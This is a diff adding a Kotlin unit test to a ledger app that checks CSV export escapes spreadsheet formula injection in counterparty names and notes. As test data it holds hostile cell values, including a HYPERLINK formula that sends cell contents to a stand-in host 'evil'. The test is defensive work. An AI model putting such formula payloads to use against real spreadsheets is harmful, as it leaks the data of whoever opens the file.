@@ -141,6 +141,34 @@ class LedgerTest {
     }
 
     @Test
+    fun `a counterparty cannot smuggle a formula into the statement`() {
+        // The counterparty column is their card's asserted name and the note
+        // is their message text, so both are somebody else's words landing
+        // in a file an accountant opens in a spreadsheet. A cell that begins
+        // = + - or @ is a formula there, not a name.
+        for (hostile in listOf(
+            "=HYPERLINK(\"http://evil/\"&A1,\"invoice\")",
+            "+1+1",
+            "-2+3",
+            "@SUM(A1:A9)",
+        )) {
+            val cell = Ledger.csvCell(hostile)
+            assertTrue(
+                "a formula cell must not survive as one: $cell",
+                cell.startsWith("'") || cell.startsWith("\"'"),
+            )
+        }
+        // Ordinary names are left exactly as they were — the guard must not
+        // start rewriting people's names.
+        assertEquals("Jordan", Ledger.csvCell("Jordan"))
+        assertEquals("Café Küçük", Ledger.csvCell("Café Küçük"))
+        // And the quoting it already did still happens, once, around the
+        // apostrophe rather than inside it.
+        assertEquals("\"'=a,b\"", Ledger.csvCell("=a,b"))
+        assertEquals("\"say \"\"hi\"\"\"", Ledger.csvCell("say \"hi\""))
+    }
+
+    @Test
     fun `a broadcast that is not on chain yet does not move the balance`() {
         val pending = SentPayment(
             txidHex = "dead".repeat(16),
